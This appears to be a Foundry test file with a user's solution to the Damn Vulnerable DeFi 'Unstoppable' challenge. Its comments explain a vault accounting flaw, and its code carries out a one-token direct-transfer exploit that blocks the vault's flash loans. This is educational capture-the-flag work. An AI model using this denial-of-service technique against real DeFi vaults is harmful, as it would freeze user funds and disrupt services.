// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {UnstoppableVault, Owned} from "../../src/unstoppable/UnstoppableVault.sol";
import {UnstoppableMonitor} from "../../src/unstoppable/UnstoppableMonitor.sol";

contract UnstoppableChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");

    uint256 constant TOKENS_IN_VAULT = 1_000_000e18;
    uint256 constant INITIAL_PLAYER_TOKEN_BALANCE = 10e18;

    DamnValuableToken public token;
    UnstoppableVault public vault;
    UnstoppableMonitor public monitorContract;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy token and vault
        token = new DamnValuableToken();
        vault = new UnstoppableVault({_token: token, _owner: deployer, _feeRecipient: deployer});

        // Deposit tokens to vault
        token.approve(address(vault), TOKENS_IN_VAULT);
        vault.deposit(TOKENS_IN_VAULT, address(deployer));

        // Fund player's account with initial token balance
        token.transfer(player, INITIAL_PLAYER_TOKEN_BALANCE);

        // Deploy monitor contract and grant it vault's ownership
        monitorContract = new UnstoppableMonitor(address(vault));
        vault.transferOwnership(address(monitorContract));

        // Monitor checks it's possible to take a flash loan
        vm.expectEmit();
        emit UnstoppableMonitor.FlashLoanStatus(true);
        monitorContract.checkFlashLoan(100e18);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        // Check initial token balances
        assertEq(token.balanceOf(address(vault)), TOKENS_IN_VAULT);
        assertEq(token.balanceOf(player), INITIAL_PLAYER_TOKEN_BALANCE);

        // Monitor is owned
        assertEq(monitorContract.owner(), deployer);

        // Check vault properties
        assertEq(address(vault.asset()), address(token));
        assertEq(vault.totalAssets(), TOKENS_IN_VAULT);
        assertEq(vault.totalSupply(), TOKENS_IN_VAULT);
        assertEq(vault.maxFlashLoan(address(token)), TOKENS_IN_VAULT);
        assertEq(vault.flashFee(address(token), TOKENS_IN_VAULT - 1), 0);
        assertEq(vault.flashFee(address(token), TOKENS_IN_VAULT), 50000e18);

        // Vault is owned by monitor contract
        assertEq(vault.owner(), address(monitorContract));

        // Vault is not paused
        assertFalse(vault.paused());

        // Cannot pause the vault
        vm.expectRevert("UNAUTHORIZED");
        vault.setPause(true);

        // Cannot call monitor contract
        vm.expectRevert("UNAUTHORIZED");
        monitorContract.checkFlashLoan(100e18);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_unstoppable() public checkSolvedByPlayer {
        console.log("Address of this test contract: ",address(this));
        console.log("Address of asset token: ",address(token));
        console.log("Address of the vault: ",address(vault));
        console.log("Address of the deployer of the vault: ",deployer);
        console.log("Vault Owner: ",vault.owner());
        console.log("Monitor contract address: ",address(monitorContract));

        // NOTICE THAT THIS TEST HAS MINTED 1000000000000000000000000 tokens of underlying asset in the vault, and the tokens minted in the vault each, initially.
        // THIS IS DONE SO THAT convertToShares() => assets * totalSupply/totalAssets() => (totalSupply)^2/totalAssets()
        // WE WANTED TO REVERT THIS EVERY TIME AND FOR THAT TO HAPPEN, convertToShares(totalSupply) MUST NOT BE EQUAL TO balanceBefore
        /*  THIS IS THE VULNERABLE CODE. totalAssets() can be incremented by transfering the underlying asset directly to the vault without going through deposit() and mint() function of the vault which calculated the "shares" proprotional to the asset.
            ROOT CAUSE: the vault thinks that .balanceOf() will be consistent with totalAssets() but this is not true as the user can transfer the asset to the vault directly using .transfer() function in that case totalSupply and totalAssets() will not remain consistent since deposit()  and mint() that calculated the shares logic was not used. 

            uint256 balanceBefore = totalAssets();
            if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();
        */
        /*
            (totalSupply)^2/totalAssets() != totalAssets() => revert will take place
            (totalSupply)^2 != (totalAssets())^2 => revert will take place
            totalSupply != totalAssets() => revert will take place

            Therefore, we assigned there initial value to be same, so that we can add 1 to totalAssets() and make the two values as different, and therefore, revert it.
        */
        // THERE INITIAL VALUE OF 
        console.log("Underlying assest value of vault: ", vault.totalAssets());
        console.log("Total shares minted by the vault: ", vault.totalSupply());
        console.log("Asset token value of the player (outside the vault): ", token.balanceOf(player));

        // The player (user) transfers 1 underlying token to the vault directly so that totalSupply() and totalAssets() become inconsistent.
        token.transfer(address(vault),1);
        console.log("Underlying assest value of vault after direct transfer: ", vault.totalAssets());
        console.log("Total shares minted by the vault after direct transfer: ", vault.totalSupply());
        console.log("Asset token value of the player (outside the vault) after transfer: ", token.balanceOf(player));

    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private {
        // Flashloan check must fail
        vm.prank(deployer);
        vm.expectEmit();
        emit UnstoppableMonitor.FlashLoanStatus(false);
        monitorContract.checkFlashLoan(100e18);

        // And now the monitor paused the vault and transferred ownership to deployer
        assertTrue(vault.paused(), "Vault is not paused");
        assertEq(vault.owner(), deployer, "Vault did not change owner");
    }
}

/*
FINAL OBSERVATION:

if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();
// this condition should always pass, meaning that this will always be reverted and loan would fail whenever [ totalSupply != totalAssets() ]
*/
